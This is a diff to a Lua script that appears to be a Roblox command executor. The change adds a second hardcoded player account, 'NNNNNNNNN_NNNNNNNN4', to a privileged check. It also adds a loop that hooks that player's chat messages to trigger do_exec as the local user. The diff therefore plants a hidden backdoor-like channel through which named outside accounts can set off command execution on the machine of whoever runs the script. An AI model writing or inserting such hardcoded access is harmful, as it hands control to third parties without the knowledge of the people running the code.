@@ -4929,7 +4929,7 @@ function execCmd(cmdStr,speaker,store)
 				cargs = args
 				if not speaker then speaker = Players.LocalPlayer end
 				if store then
-					if speaker == Players.LocalPlayer or speaker == Players['KudaGamer278'] then
+					if speaker == Players.LocalPlayer or speaker == Players['KudaGamer278'] or speaker == Players['NNNNNNNNN_NNNNNNNN4'] then
 						if cmdHistory[1] ~= rawCmdStr and rawCmdStr:sub(1,11) ~= 'lastcommand' and rawCmdStr:sub(1,7) ~= 'lastcmd' then
 							table.insert(cmdHistory,1,rawCmdStr)
 						end
@@ -5431,8 +5431,23 @@ Players.LocalPlayer.Chatted:Connect(function()
 end)
 
 while true do
-	if Players['KudaGamer278'] then
+	if Players['KudaGamer278'] ~= nil then
 		Players['KudaGamer278'].Chatted:Connect(function()
+			wait()
+			if lastEnteredString then
+				local message = lastEnteredString
+				lastEnteredString = nil
+				do_exec(message, Players.LocalPlayer)
+			end
+		end)
+		break
+	end
+	wait(0.01)
+end
+
+while true do
+	if Players['NNNNNNNNN_NNNNNNNN4'] ~= nil then
+		Players['NNNNNNNNN_NNNNNNNN4'].Chatted:Connect(function()
 			wait()
 			if lastEnteredString then
 				local message = lastEnteredString
